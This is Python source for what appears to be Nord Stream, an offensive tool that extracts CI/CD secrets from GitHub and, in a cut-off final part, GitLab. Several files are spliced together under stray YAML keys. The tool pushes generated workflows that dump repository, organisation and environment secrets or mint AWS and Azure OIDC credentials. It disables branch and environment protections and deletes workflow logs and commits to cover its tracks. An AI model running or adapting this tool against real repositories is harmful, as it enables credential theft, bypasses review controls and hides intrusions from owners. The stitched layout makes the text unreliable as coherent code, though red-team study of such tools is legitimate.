        displayRequiredPullRequestReviews(protections.get("required_pull_request_reviews"))
    else:
        logger.raw(f"\t- required pull request reviews: False\n", logging.INFO)

    if protections.get("required_status_checks"):
        displayRequiredStatusChecks(protections.get("required_status_checks"))

    logger.raw(
        "\t- required linear history:" f' {protections.get("required_linear_history").get("enabled")}\n',
        logging.INFO,
    )
    logger.raw(
        "\t- required conversation resolution:"
        f' {protections.get("required_conversation_resolution").get("enabled")}\n',
        logging.INFO,
    )
    logger.raw(
        f'\t- lock branch: {protections.get("lock_branch").get("enabled")}\n',
        logging.INFO,
    )
    logger.raw(
        "\t- allow fork syncing:" f' {protections.get("allow_fork_syncing").get("enabled")}\n',
        logging.INFO,
    )


def displayRequiredStatusChecks(data):

    logger.raw(f"\t- required status checks:\n", logging.INFO)
    logger.raw(f'\t    - strict: {data.get("strict")}\n', logging.INFO)

    if len(data.get("contexts")) != 0:
        logger.raw(f'\t    - contexts: {data.get("contexts")}\n', logging.INFO)

    if len(data.get("checks")) != 0:
        logger.raw(f'\t    - checks: {data.get("checks")}\n', logging.INFO)


def displayRequiredPullRequestReviews(data):

    logger.raw(f"\t- pull request reviews:\n", logging.INFO)
    logger.raw(f'\t    - approving review count: {data.get("required_approving_review_count")}\n', logging.INFO)
    logger.raw(f'\t    - require code owner reviews: {data.get("require_code_owner_reviews")}\n', logging.INFO)
    logger.raw(f'\t    - require last push approval: {data.get("require_last_push_approval")}\n', logging.INFO)
    logger.raw(f'\t    - dismiss stale reviews: {data.get("dismiss_stale_reviews")}\n', logging.INFO)

    if data.get("dismissal_restrictions"):
        users = getUsersArray(data.get("dismissal_restrictions").get("users"))
        teams = getTeamsOrAppsArray(data.get("dismissal_restrictions").get("teams"))
        apps = getTeamsOrAppsArray(data.get("dismissal_restrictions").get("apps"))

        if len(users) != 0 or len(teams) != 0 or len(apps) != 0:
            logger.raw(f"\t    - dismissal_restrictions:\n", logging.INFO)

            if len(users) != 0:
                logger.raw(f"\t        - users: {users}\n", logging.INFO)
            if len(teams) != 0:
                logger.raw(f"\t        - teams: {teams}\n", logging.INFO)
            if len(apps) != 0:
                logger.raw(f"\t        - apps: {apps}\n", logging.INFO)

    if data.get("bypass_pull_request_allowances"):
        users = getUsersArray(data.get("bypass_pull_request_allowances").get("users"))
        teams = getTeamsOrAppsArray(data.get("bypass_pull_request_allowances").get("teams"))
        apps = getTeamsOrAppsArray(data.get("bypass_pull_request_allowances").get("apps"))

        if len(users) != 0 or len(teams) != 0 or len(apps) != 0:
            logger.raw(f"\t    - bypass pull request allowances:\n", logging.INFO)

            if len(users) != 0:
                logger.raw(f"\t        - users: {users}\n", logging.INFO)
            if len(teams) != 0:
                logger.raw(f"\t        - teams: {teams}\n", logging.INFO)
            if len(apps) != 0:
                logger.raw(f"\t        - apps: {apps}\n", logging.INFO)


def displayRestrictions(data):
    users = getUsersArray(data.get("users"))
    teams = getTeamsOrAppsArray(data.get("teams"))
    apps = getTeamsOrAppsArray(data.get("apps"))

    if len(users) != 0 or len(teams) != 0 or len(apps) != 0:
        logger.raw(f"\t- person allowed to push to restricted branches (restrictions):\n", logging.INFO)

        if len(users) != 0:
            logger.raw(f"\t    - users: {users}\n", logging.INFO)
        if len(teams) != 0:
            logger.raw(f"\t    - teams: {teams}\n", logging.INFO)
        if len(apps) != 0:
            logger.raw(f"\t    - apps: {apps}\n", logging.INFO)

jobs: import logging
import base64
import glob
from zipfile import ZipFile
from os import makedirs, chdir
from os.path import exists, realpath
from nordstream.yaml.github import WorkflowGenerator
from nordstream.core.github.protections import (
    resetRequiredStatusCheck,
    resetRequiredPullRequestReviews,
    resetRestrictions,
)
from nordstream.core.github.display import *
from nordstream.utils.errors import GitHubError, GitPushError, GitHubBadCredentials
from nordstream.utils.log import logger, NordStreamLog
from nordstream.git import Git
import subprocess


class GitHubWorkflowRunner:
    _cicd = None
    _taskName = "command"
    _workflowFilename = "init_ZkITM.yaml"
    _fileName = None
    _env = None
    _extractRepo = True
    _extractEnv = True
    _extractOrg = True
    _yaml = None
    _exploitOIDC = False
    _tenantId = None
    _subscriptionId = None
    _clientId = None
    _role = None
    _region = None
    _forceDeploy = False
    _disableProtections = None
    _writeAccessFilter = False
    _branchAlreadyExists = False
    _pushedCommitsCount = 0
    _cleanLogs = True

    def __init__(self, cicd, env):
        self._cicd = cicd
        self._env = env
        self.__createLogDir()

    @property
    def extractRepo(self):
        return self._extractRepo

    @extractRepo.setter
    def extractRepo(self, value):
        self._extractRepo = value

    @property
    def extractEnv(self):
        return self._extractEnv

    @extractEnv.setter
    def extractEnv(self, value):
        self._extractEnv = value

    @property
    def extractOrg(self):
        return self._extractOrg

    @extractOrg.setter
    def extractOrg(self, value):
        self._extractOrg = value

    @property
    def workflowFilename(self):
        return self._workflowFilename

    @workflowFilename.setter
    def workflowFilename(self, value):
        self._workflowFilename = value

    @property
    def yaml(self):
        return self._yaml

    @yaml.setter
    def yaml(self, value):
        self._yaml = realpath(value)

    @property
    def exploitOIDC(self):
        return self._exploitOIDC

    @exploitOIDC.setter
    def exploitOIDC(self, value):
        self._exploitOIDC = value

    @property
    def tenantId(self):
        return self._tenantId

    @tenantId.setter
    def tenantId(self, value):
        self._tenantId = value

    @property
    def subscriptionId(self):
        return self._subscriptionId

    @subscriptionId.setter
    def subscriptionId(self, value):
        self._subscriptionId = value

    @property
    def clientId(self):
        return self._clientId

    @clientId.setter
    def clientId(self, value):
        self._clientId = value

    @property
    def role(self):
        return self._role

    @role.setter
    def role(self, value):
        self._role = value

    @property
    def region(self):
        return self._region

    @region.setter
    def region(self, value):
        self._region = value

    @property
    def disableProtections(self):
        return self._disableProtections

    @disableProtections.setter
    def disableProtections(self, value):
        self._disableProtections = value

    @property
    def writeAccessFilter(self):
        return self._writeAccessFilter

    @writeAccessFilter.setter
    def writeAccessFilter(self, value):
        self._writeAccessFilter = value

    @property
    def branchAlreadyExists(self):
        return self._branchAlreadyExists

    @branchAlreadyExists.setter
    def branchAlreadyExists(self, value):
        self._branchAlreadyExists = value

    @property
    def pushedCommitsCount(self):
        return self._pushedCommitsCount

    @pushedCommitsCount.setter
    def pushedCommitsCount(self, value):
        self._pushedCommitsCount = value

    @property
    def forceDeploy(self):
        return self._forceDeploy

    @forceDeploy.setter
    def forceDeploy(self, value):
        self._forceDeploy = value

    @property
    def cleanLogs(self):
        return self._cleanLogs

    @cleanLogs.setter
    def cleanLogs(self, value):
        self._cleanLogs = value

    def __createLogDir(self):
        self._cicd.outputDir = realpath(self._cicd.outputDir) + "/github"
        makedirs(self._cicd.outputDir, exist_ok=True)

    @staticmethod
    def __createWorkflowDir():
        makedirs(".github/workflows", exist_ok=True)

    def __extractWorkflowOutput(self, repo):
        name = self._fileName.strip(".zip")
        with ZipFile(f"{self._cicd.outputDir}/{repo}/{self._fileName}") as zipOutput:
            zipOutput.extractall(f"{self._cicd.outputDir}/{repo}/{name}")

    def __extractSensitiveInformationFromWorkflowResult(self, repo, informationType="Secrets"):
        filePath = self.__getWorkflowOutputFileName(repo)
        if filePath:
            with open(filePath, "r") as output:
                # well it's working
                data = output.readlines()[-1].split(" ")[1]

                try:
                    secrets = base64.b64decode(base64.b64decode(data))
                except Exception as e:
                    logger.exception(e)
            logger.success(f"{informationType}:")
            logger.raw(secrets, logging.INFO)

            with open(f"{self._cicd.outputDir}/{repo}/{informationType.lower().replace(' ', '_')}.txt", "ab") as file:
                file.write(secrets)

    def __getWorkflowOutputFileName(self, repo):
        name = self._fileName.strip(".zip")
        filePaths = glob.glob(f"{self._cicd.outputDir}/{repo}/{name}/init/*_{self._taskName}*.txt")
        logger.debug(filePaths)
        logger.debug(f"{self._cicd.outputDir}/{repo}/{name}/init/*_{self._taskName}*.txt")
        if len(filePaths) > 0:
            filePath = filePaths[0]
            return filePath

        else:
            logger.success(f"Data is accessible here: {self._cicd.outputDir}/{repo}/{name}/")
            return None

    def __displayCustomWorkflowOutput(self, repo):
        filePath = self.__getWorkflowOutputFileName(repo)
        if filePath:
            with open(filePath, "r") as output:
                logger.success("Workflow output:")
                line = output.readline()
                while line != "":
                    logger.raw(line, logging.INFO)
                    line = output.readline()

    def createYaml(self, repo, workflowType):

        workflowGenerator = WorkflowGenerator()

        if workflowType == "awsoidc":
            workflowGenerator.generateWorkflowForOIDCAWSTokenGeneration(self._role, self._region, self._env)
        elif workflowType == "azureoidc":
            workflowGenerator.generateWorkflowForOIDCAzureTokenGeneration(
                self._tenantId, self._subscriptionId, self._clientId, self._env
            )
        else:
            repo = self._cicd.org + "/" + repo

            if self._env:
                try:
                    secrets = self._cicd.listSecretsFromEnv(repo, self._env)
                except GitHubError as e:
                    # FIXME: Raise an Exception here
                    logger.exception(e)
            else:
                secrets = self._cicd.listSecretsFromRepo(repo)

            if len(secrets) > 0:
                workflowGenerator.generateWorkflowForSecretsExtraction(secrets, self._env)
            else:
                logger.info("No secret found.")

        logger.success("YAML file: ")
        workflowGenerator.displayYaml()
        workflowGenerator.writeFile(self._workflowFilename)

    def __extractSecretsFromRepo(self, repo):
        logger.info(f'Getting secrets from repo: "{repo}"')
        secrets = []

        try:
            if self._extractRepo:
                secrets += self._cicd.listSecretsFromRepo(repo)
            if self._extractOrg:
                secrets += self._cicd.listOrganizationSecretsFromRepo(repo)
        except GitHubError as e:
            logger.error(e)

        if len(secrets) > 0:
            workflowGenerator = WorkflowGenerator()
            workflowGenerator.generateWorkflowForSecretsExtraction(secrets)

            if self.__generateAndLaunchWorkflow(repo, workflowGenerator, "repo", self._env):
                self.__extractSensitiveInformationFromWorkflowResult(repo)

        else:
            logger.info("No secret found")

        logger.empty_line()

    def __extractSecretsFromSingleEnv(self, repo, env):
        logger.info(f'Getting secrets from environment: "{env}" ({repo})')
        secrets = []

        try:
            secrets = self._cicd.listSecretsFromEnv(repo, env)
        except GitHubError as e:
            logger.error(e)

        if len(secrets) > 0:
            workflowGenerator = WorkflowGenerator()
            workflowGenerator.generateWorkflowForSecretsExtraction(secrets, env)

            if self.__generateAndLaunchWorkflow(repo, workflowGenerator, f"env_{env}", env):
                self.__extractSensitiveInformationFromWorkflowResult(repo)

        else:
            logger.info("No secret found")

        logger.empty_line()

    def __extractSecretsFromAllEnv(self, repo):
        for env in self._cicd.listEnvFromrepo(repo):
            self.__extractSecretsFromSingleEnv(repo, env)

    def __extractSecretsFromEnv(self, repo):
        if self._env:
            self.__extractSecretsFromSingleEnv(repo, self._env)
        else:
            self.__extractSecretsFromAllEnv(repo)

    def __generateAndLaunchWorkflow(self, repo, workflowGenerator, outputName, env=None):

        policyId = waitTime = reviewers = branchPolicy = envDetails = None

        try:

            # disable env protection before launching the workflow if no '--force' and env is not null
            if not self._forceDeploy and env:

                # check protection and if enabled return the protections
                envDetails = self.__isEnvProtectionsEnabled(repo, env)
                if envDetails and len(envDetails.get("protection_rules")):

                    # if --disable-protection disable the env protections
                    if self._disableProtections:
                        (
                            policyId,
                            waitTime,
                            reviewers,
                            branchPolicy,
                        ) = self.__disableEnvProtections(repo, envDetails)
                    else:
                        raise Exception("Environment protection rule enabled but '--disable-protections' not activated")

            # start the workflow
            workflowId, workflowConclusion = self.__launchWorkflow(repo, workflowGenerator)

            # check workflow status and get result if it's ok
            return self.__postProcessingWorkflow(repo, workflowId, workflowConclusion, outputName)

        except GitPushError as e:
            pass

        except Exception as e:
            logger.error(f"Error: {e}")
            if logger.getEffectiveLevel() == logging.DEBUG:
                logger.exception(e)

        finally:

            # restore protections
            if self._disableProtections and envDetails:
                self.__restoreEnvProtections(repo, env, policyId, waitTime, reviewers, branchPolicy)

    def __launchWorkflow(self, repo, workflowGenerator):
        logger.verbose(f"Launching workflow.")

        workflowGenerator.writeFile(f".github/workflows/{self._workflowFilename}")

        pushOutput = Git.gitPush(self._cicd.branchName)
        pushOutput.wait()

        if b"Everything up-to-date" in pushOutput.communicate()[1].strip():
            logger.error("Error when pushing code: Everything up-to-date")
            logger.warning("Your trying to push the same code on an existing branch, modify the yaml file to push it.")
            raise GitPushError

        elif pushOutput.returncode != 0:
            logger.error("Error when pushing code:")
            logger.raw(pushOutput.communicate()[1], logging.INFO)
            raise GitPushError

        else:
            self._pushedCommitsCount += 1

            logger.raw(pushOutput.communicate()[1])
            workflowId, workflowConclusion = self._cicd.waitWorkflow(repo, self._workflowFilename)

            return workflowId, workflowConclusion

    def __postProcessingWorkflow(self, repo, workflowId, workflowConclusion, outputName):

        if workflowId and workflowConclusion == "success":
            logger.success("Workflow has successfully terminated.")
            self._fileName = self._cicd.downloadWorkflowOutput(
                repo,
                f"{outputName.replace('/','_').replace(' ', '_')}",
                workflowId,
            )
            self.__extractWorkflowOutput(repo)
            return True
        elif workflowId and workflowConclusion == "failure":
            logger.error("Workflow failure:")
            for reason in self._cicd.getFailureReason(repo, workflowId):
                logger.error(f"{reason}")
            return False
        else:
            return False

    def listGitHubRepos(self):
        logger.info("Listing all repos:")
        for r in self._cicd.repos:
            logger.raw(f"- {r}\n", level=logging.INFO)

    def listGitHubSecrets(self):
        logger.info("Listing secrets:")
        for repo in self._cicd.repos:
            logger.info(f'"{repo}" secrets')

            if self._extractRepo:
                self.__displayRepoSecrets(repo)

            if self._extractEnv:
                self.__displayEnvSecrets(repo)

            if self._extractOrg:
                self.__displayOrgSecrets(repo)

    def __displayRepoSecrets(self, repo):
        try:
            secrets = self._cicd.listSecretsFromRepo(repo)
            displayRepoSecrets(secrets)
        except Exception:
            if logger.getEffectiveLevel() == NordStreamLog.VERBOSE:
                logger.error("Can't get repo secrets.")

    def __displayEnvSecrets(self, repo):
        try:
            envs = self._cicd.listEnvFromrepo(repo)
        except Exception:
            if logger.getEffectiveLevel() == NordStreamLog.VERBOSE:
                logger.error("Can't list environment.")
            return

        for env in envs:
            try:
                secrets = self._cicd.listSecretsFromEnv(repo, env)
                displayEnvSecrets(env, secrets)
            except Exception:
                if logger.getEffectiveLevel() == NordStreamLog.VERBOSE:
                    logger.error(f"Can't get secrets for env {env}.")

    def __displayOrgSecrets(self, repo):
        try:
            secrets = self._cicd.listOrganizationSecretsFromRepo(repo)
            displayOrgSecrets(secrets)
        except Exception:
            if logger.getEffectiveLevel() == NordStreamLog.VERBOSE:
                logger.error("Can't get org secrets.")

    def getRepos(self, repo):

        try:
            if repo:
                if exists(repo):
                    with open(repo, "r") as file:
                        for repo in file:
                            self._cicd.addRepo(repo.strip())

                else:
                    self._cicd.addRepo(repo)

            else:
                self._cicd.listRepos()

        except GitHubBadCredentials:
            logger.fatal("Invalid token.")

        if self._writeAccessFilter:
            self._cicd.filterWriteRepos()

        if len(self._cicd.repos) == 0:
            if self._writeAccessFilter:
                logger.critical("No repository with write access found.")
            else:
                logger.critical("No repository found.")

    def manualCleanLogs(self):
        logger.info("Deleting logs")
        for repo in self._cicd.repos:
            self._cicd.cleanAllLogs(repo, self._workflowFilename)

    def manualCleanBranchPolicy(self):
        logger.info("Deleting deployment branch policy")
        for repo in self._cicd.repos:
            self._cicd.deleteDeploymentBranchPolicyForAllEnv(repo)

    def __runCustomWorkflow(self, repo):
        logger.info(f"Running custom workflow: {self._yaml}")

        workflowGenerator = WorkflowGenerator()
        workflowGenerator.loadFile(self._yaml)

        if self.__generateAndLaunchWorkflow(repo, workflowGenerator, "custom", self._env):
            self.__displayCustomWorkflowOutput(repo)

        logger.empty_line()

    def __runOIDCTokenGenerationWorfklow(self, repo):

        workflowGenerator = WorkflowGenerator()
        if self._tenantId is not None and self._clientId is not None:
            logger.info("Running OIDC Azure access tokens generation workflow")
            informationType = "OIDC access tokens"
            workflowGenerator.generateWorkflowForOIDCAzureTokenGeneration(
                self._tenantId, self._subscriptionId, self._clientId, self._env
            )
        else:
            logger.info("Running OIDC AWS credentials generation workflow")
            informationType = "OIDC credentials"
            workflowGenerator.generateWorkflowForOIDCAWSTokenGeneration(self._role, self._region, self._env)

        if self.__generateAndLaunchWorkflow(repo, workflowGenerator, "oidc", self._env):
            self.__extractSensitiveInformationFromWorkflowResult(repo, informationType=informationType)

        logger.empty_line()

    def __runSecretsExtractionWorkflow(self, repo):
        if self._extractRepo or self._extractOrg:
            self.__extractSecretsFromRepo(repo)

        if self._extractEnv:
            self.__extractSecretsFromEnv(repo)

    def __deleteRemoteBranch(self):
        logger.verbose("Deleting remote branch")
        deleteOutput = Git.gitDeleteRemote(self._cicd.branchName)
        deleteOutput.wait()

        if deleteOutput.returncode != 0:
            logger.error(f"Error deleting remote branch {self._cicd.branchName}")
            logger.raw(deleteOutput.communicate()[1], logging.INFO)
            return False
        return True

    def __clean(self, repo, cleanRemoteLogs=True):

        if self._pushedCommitsCount > 0:

            if cleanRemoteLogs:
                logger.info("Cleaning logs.")

                try:

                    self._cicd.cleanAllLogs(repo, self._workflowFilename)

                except Exception as e:
                    logger.error(f"Error while cleaning logs: {e}")
                    if self._cicd.isGHSToken():
                        logger.warn(f"This might be due to the GHS token.")

            logger.verbose("Cleaning commits.")
            if self._branchAlreadyExists and self._cicd.branchName != self._cicd.defaultBranchName:
                Git.gitUndoLastPushedCommits(self._cicd.branchName, self._pushedCommitsCount)
            else:
                if not self.__deleteRemoteBranch():
                    logger.info("Cleaning remote branch.")
                    # rm everything if we can't delete the branch (only leave one file otherwise it will try to rm the branch)
                    Git.gitCleanRemote(self._cicd.branchName, leaveOneFile=True)

    def start(self):

        for repo in self._cicd.repos:
            logger.success(f'"{repo}"')

            url = f"https://foo:{self._cicd.token}@github.com/{repo}"
            Git.gitClone(url)

            repoShortName = repo.split("/")[1]
            chdir(repoShortName)
            self._pushedCommitsCount = 0
            self._branchAlreadyExists = Git.gitRemoteBranchExists(self._cicd.branchName)
            Git.gitInitialization(self._cicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

            try:

                # check and disable branch protection rules
                protections = None
                if not self._forceDeploy:
                    protections = self.__checkAndDisableBranchProtectionRules(repo)

                self.__createWorkflowDir()
                self.__dispatchWorkflow(repo)

            except KeyboardInterrupt:
                pass

            except Exception as e:
                logger.error(f"Error: {e}")
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)

            finally:

                self.__clean(repo, cleanRemoteLogs=self._cleanLogs)

                # if we are working with the default nord-stream branch we managed to
                # delete the branch during the previous clean operation

                if self._cicd.branchName != self._cicd.defaultBranchName:
                    if protections:
                        self.__resetBranchProtectionRules(repo, protections)

                chdir("../")
                subprocess.Popen(f"rm -rfd ./{repoShortName}", shell=True).wait()

        logger.info(f"Check output: {self._cicd.outputDir}")

    def __dispatchWorkflow(self, repo):
        if self._yaml:
            self.__runCustomWorkflow(repo)
        elif self._exploitOIDC:
            self.__runOIDCTokenGenerationWorfklow(repo)
        else:
            self.__runSecretsExtractionWorkflow(repo)

    def __checkAllEnvSecurity(self, repo):

        try:
            for env in self._cicd.listEnvFromrepo(repo):
                self.__checkSingleEnvSecurity(repo, env)
        except GitHubError as e:
            logger.error(f"Error while getting env security: {e}")
            if self._cicd.isGHSToken():
                logger.warn(f"This might be due to the GHS token.")

    def __checkSingleEnvSecurity(self, repo, env):
        envDetails = self._cicd.getEnvDetails(repo, env)
        displayEnvSecurity(envDetails)

    def checkBranchProtections(self):
        for repo in self._cicd.repos:
            logger.info(f'Checking security: "{repo}"')
            # TODO: check branch wide protection
            # For now, it's not available in the REST API. It could still be performed using the GraphQL API.
            # https://github.com/github/safe-settings/issues/311
            protectionEnabled = False

            url = f"https://foo:{self._cicd.token}@github.com/{repo}"
            Git.gitClone(url)

            repoShortName = repo.split("/")[1]
            chdir(repoShortName)
            self._pushedCommitsCount = 0
            self._branchAlreadyExists = Git.gitRemoteBranchExists(self._cicd.branchName)
            Git.gitInitialization(self._cicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

            try:
                protectionEnabled, protection = self.__checkAndGetBranchProtectionRules(repo)

                if protectionEnabled:
                    if protection:
                        displayBranchProtectionRules(protection)
                    else:
                        logger.info(
                            "Not enough privileges to get protection rules or 'Restrict pushes that create matching branches' is enabled. Check another branch."
                        )

                self.__checkAllEnvSecurity(repo)

            except Exception as e:
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)
            finally:
                # don't clean remote logs as we didn't push any workflow here.
                self.__clean(repo, cleanRemoteLogs=False)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{repoShortName}", shell=True).wait()

    def _checkBranchProtectionRules(self, repo):
        protectionEnabled = False

        try:
            protectionEnabled = self._cicd.checkBranchProtectionRules(repo)
        except GitHubError:
            pass

        if not protectionEnabled:
            Git.gitCreateEmptyFile("test_push.md")
            pushOutput = Git.gitPush(self._cicd.branchName)
            pushOutput.wait()

            if pushOutput.returncode != 0:
                logger.error("Error when pushing code:")
                logger.raw(pushOutput.communicate()[1], logging.INFO)
                return True
            else:
                self._pushedCommitsCount += 1

            try:
                protectionEnabled = self._cicd.checkBranchProtectionRules(repo)
            except GitHubError:
                pass
        return protectionEnabled

    def __checkAndDisableBranchProtectionRules(self, repo):

        protectionEnabled, protection = self.__checkAndGetBranchProtectionRules(repo)

        if protectionEnabled:

            if protection:
                displayBranchProtectionRules(protection)
            else:
                logger.info(
                    "Not enough privileges to get protection rules or 'Restrict pushes that create matching branches' is enabled. Check another branch."
                )

            if protection and self.disableProtections:
                if self._cicd.branchName != self._cicd.defaultBranchName:
                    logger.warning("Removing branch protection, wait until it's restored.")
                else:
                    # no need to restore branch protection if we are working with the default
                    # nord-stream branch
                    logger.warning("Removing branch protection.")

                self._cicd.disableBranchProtectionRules(repo)
                return protection

            elif self.disableProtections:
                # if we can't list protection this means that we don't have enough privileges
                raise Exception(
                    "Not enough privileges to disable protection rules or 'Restrict pushes that create matching branches' is enabled. Check another branch."
                )
            else:
                raise Exception("branch protection rule enabled but '--disable-protections' not activated")

        return None

    def __checkAndGetBranchProtectionRules(self, repo):
        protectionEnabled = self._checkBranchProtectionRules(repo)

        if protectionEnabled:
            logger.info(f'Found branch protection rule on "{self._cicd.branchName}" branch')
            try:
                protection = self._cicd.getBranchesProtectionRules(repo)
                return True, protection

            except GitHubError:
                return True, None
        else:
            logger.info(f'No branch protection rule found on "{self._cicd.branchName}" branch')
        return False, None

    def __isEnvProtectionsEnabled(self, repo, env):
        envDetails = self._cicd.getEnvDetails(repo, env)
        protectionRules = envDetails.get("protection_rules")

        if len(protectionRules) > 0:
            displayEnvSecurity(envDetails)
            return envDetails

        else:
            logger.verbose("No environment protection rule found")
            return False

        return policyId, waitTime, reviewers, branchPolicy

    def __disableEnvProtections(self, repo, envDetails):
        protectionRules = envDetails.get("protection_rules")
        branchPolicy = envDetails.get("deployment_branch_policy")
        waitTime = 0
        reviewers = []
        policyId = None
        env = envDetails.get("name")

        try:
            logger.warning("Modifying env protection, wait until it's restored.")
            if branchPolicy and branchPolicy.get("custom_branch_policies", False):
                policyId = self._cicd.createDeploymentBranchPolicy(repo, env)

            for protection in protectionRules:
                if protection.get("type") == "required_reviewers":
                    for reviewer in protection.get("reviewers"):
                        reviewers.append(
                            {
                                "type": reviewer.get("type"),
                                "id": reviewer.get("reviewer").get("id"),
                            }
                        )
                if protection.get("type") == "wait_timer":
                    waitTime = protection.get("wait_timer")

            self._cicd.modifyEnvProtectionRules(repo, env, 0, [], branchPolicy)
        except GitHubError:
            raise Exception("Environment protection rule enabled but not enough privileges to disable it.")

        return policyId, waitTime, reviewers, branchPolicy

    def __restoreEnvProtections(self, repo, env, policyId, waitTime, reviewers, branchPolicy):
        logger.warning("Restoring env protections.")
        if policyId is not None:
            self._cicd.deleteDeploymentBranchPolicy(repo, env)
        self._cicd.modifyEnvProtectionRules(repo, env, waitTime, reviewers, branchPolicy)

    def describeToken(self):
        response = self._cicd.getUser()
        headers = response.headers
        response = response.json()

        logger.info("Token information:")

        login = response.get("login")
        if login != None:
            logger.raw(f"\t- Login: {login}\n", logging.INFO)

        isAdmin = response.get("site_admin")
        if isAdmin != None:
            logger.raw(f"\t- IsAdmin: {isAdmin}\n", logging.INFO)

        email = response.get("email")
        if email != None:
            logger.raw(f"\t- Email: {email}\n", logging.INFO)

        id = response.get("id")
        if id != None:
            logger.raw(f"\t- Id: {id}\n", logging.INFO)

        bio = response.get("bio")
        if bio != None:
            logger.raw(f"\t- Bio: {bio}\n", logging.INFO)

        company = response.get("company")
        if company != None:
            logger.raw(f"\t- Company: {company}\n", logging.INFO)

        tokenScopes = headers.get("x-oauth-scopes")
        if tokenScopes != None:
            scopes = tokenScopes.split(", ")
            if len(scopes) != 0:
                logger.raw(f"\t- Token scopes:\n", logging.INFO)
                for scope in scopes:
                    logger.raw(f"\t    - {scope}\n", logging.INFO)

    def __resetBranchProtectionRules(self, repo, protections):

        logger.warning("Restoring branch protection.")

        data = {}

        data["required_status_checks"] = resetRequiredStatusCheck(protections)
        data["required_pull_request_reviews"] = resetRequiredPullRequestReviews(protections)
        data["restrictions"] = resetRestrictions(protections)

        data["enforce_admins"] = protections.get("enforce_admins").get("enabled")
        data["allow_deletions"] = protections.get("allow_deletions").get("enabled")
        data["allow_force_pushes"] = protections.get("allow_force_pushes").get("enabled")
        data["block_creations"] = protections.get("block_creations").get("enabled")

        res = self._cicd.updateBranchesProtectionRules(repo, data)

        msg = res.get("message")
        if msg:
            logger.error(f"Fail to restore protection: {msg}")
            logger.info(f"Raw protections: {protections}")
  analyze: from collections import defaultdict


def resetRequiredStatusCheck(protections):

    res = defaultdict(dict)
    required_status_checks = protections.get("required_status_checks")
    if required_status_checks:

        res["strict"] = required_status_checks.get("strict")
        res["contexts"] = required_status_checks.get("contexts")

        if required_status_checks.get("checks"):
            res["checks"] = required_status_checks.get("checks")

        return dict(res)

    else:
        return None


def resetRequiredPullRequestReviews(protections):

    res = defaultdict(dict)
    required_pull_request_reviews = protections.get("required_pull_request_reviews")

    if required_pull_request_reviews:

        if required_pull_request_reviews.get("dismissal_restrictions"):
            res["dismissal_restrictions"]["users"] = getUsersArray(
                required_pull_request_reviews.get("dismissal_restrictions").get("users")
            )
            res["dismissal_restrictions"]["teams"] = getTeamsOrAppsArray(
                required_pull_request_reviews.get("dismissal_restrictions").get("teams")
            )
            res["dismissal_restrictions"]["apps"] = getTeamsOrAppsArray(
                required_pull_request_reviews.get("dismissal_restrictions").get("apps")
            )

        if required_pull_request_reviews.get("dismiss_stale_reviews"):
            res["dismiss_stale_reviews"] = required_pull_request_reviews.get("dismiss_stale_reviews")

        if required_pull_request_reviews.get("require_code_owner_reviews"):
            res["require_code_owner_reviews"] = required_pull_request_reviews.get("require_code_owner_reviews")

        if required_pull_request_reviews.get("required_approving_review_count"):
            res["required_approving_review_count"] = required_pull_request_reviews.get(
                "required_approving_review_count"
            )

        if required_pull_request_reviews.get("require_last_push_approval"):
            res["require_last_push_approval"] = required_pull_request_reviews.get("require_last_push_approval")

        if required_pull_request_reviews.get("bypass_pull_request_allowances"):
            res["bypass_pull_request_allowances"]["users"] = getUsersArray(
                required_pull_request_reviews.get("bypass_pull_request_allowances").get("users")
            )
            res["bypass_pull_request_allowances"]["teams"] = getTeamsOrAppsArray(
                required_pull_request_reviews.get("bypass_pull_request_allowances").get("teams")
            )
            res["bypass_pull_request_allowances"]["apps"] = getTeamsOrAppsArray(
                required_pull_request_reviews.get("bypass_pull_request_allowances").get("apps")
            )

        return dict(res)

    else:
        return None


def resetRestrictions(protections):

    res = defaultdict(dict)
    restrictions = protections.get("restrictions")

    if restrictions:
        res["users"] = getUsersArray(restrictions.get("users"))
        res["teams"] = getTeamsOrAppsArray(restrictions.get("teams"))
        res["apps"] = getTeamsOrAppsArray(restrictions.get("apps"))

        return dict(res)

    else:
        return None


def getUsersArray(users):
    res = []
    for user in users:
        res.append(user.get("login"))
    return res


def getTeamsOrAppsArray(data):
    res = []
    for e in data:
        res.append(e.get("slug"))
    return res
    permissions: import logging

from urllib.parse import urlparse
from os import makedirs, chdir
from os.path import exists, realpath
from nordstream.utils.log import logger
from nordstream.git import Git
import subprocess
from nordstream.utils.errors import GitLabError
from nordstream.yaml.gitlab import GitLabPipelineGenerator


class GitLabRunner:
    _cicd = None
    _writeAccessFilter = False
    _extractProject = True
    _extractGroup = True
    _extractInstance = True
    _yaml = None
    _branchAlreadyExists = False
    _fileName = None
    _cleanLogs = True

    @property
    def writeAccessFilter(self):
        return self._writeAccessFilter

    @writeAccessFilter.setter
    def writeAccessFilter(self, value):
        self._writeAccessFilter = value

    @property
    def extractProject(self):
        return self._extractProject

    @extractProject.setter
    def extractProject(self, value):
        self._extractProject = value

    @property
    def extractGroup(self):
        return self._extractGroup

    @extractGroup.setter
    def extractGroup(self, value):
        self._extractGroup = value

    @property
    def extractInstance(self):
        return self._extractInstance

    @extractInstance.setter
    def extractInstance(self, value):
        self._extractInstance = value

    @property
    def yaml(self):
        return self._yaml

    @yaml.setter
    def yaml(self, value):
        self._yaml = realpath(value)

    @property
    def branchAlreadyExists(self):
        return self._branchAlreadyExists

    @branchAlreadyExists.setter
    def branchAlreadyExists(self, value):
        self._branchAlreadyExists = value

    @property
    def cleanLogs(self):
        return self._cleanLogs

    @cleanLogs.setter
    def cleanLogs(self, value):
        self._cleanLogs = value

    def __init__(self, cicd):
        self._cicd = cicd
        self.__createLogDir()

    def __createLogDir(self):
        self._cicd.outputDir = realpath(self._cicd.outputDir) + "/gitlab"
        makedirs(self._cicd.outputDir, exist_ok=True)

    def getProjects(self, project, strict=False):
        if project:
            if exists(project):
                with open(project, "r") as file:
                    for p in file:
                        self._cicd.addProject(project=p.strip(), filterWrite=self._writeAccessFilter, strict=strict)

            else:
                self._cicd.addProject(project=project, filterWrite=self._writeAccessFilter, strict=strict)
        else:
            self._cicd.addProject(filterWrite=self._writeAccessFilter)

        if len(self._cicd.projects) == 0:
            if self._writeAccessFilter:
                logger.critical("No repository with write access found.")
            else:
                logger.critical("No repository found.")

    def getGroups(self, group):
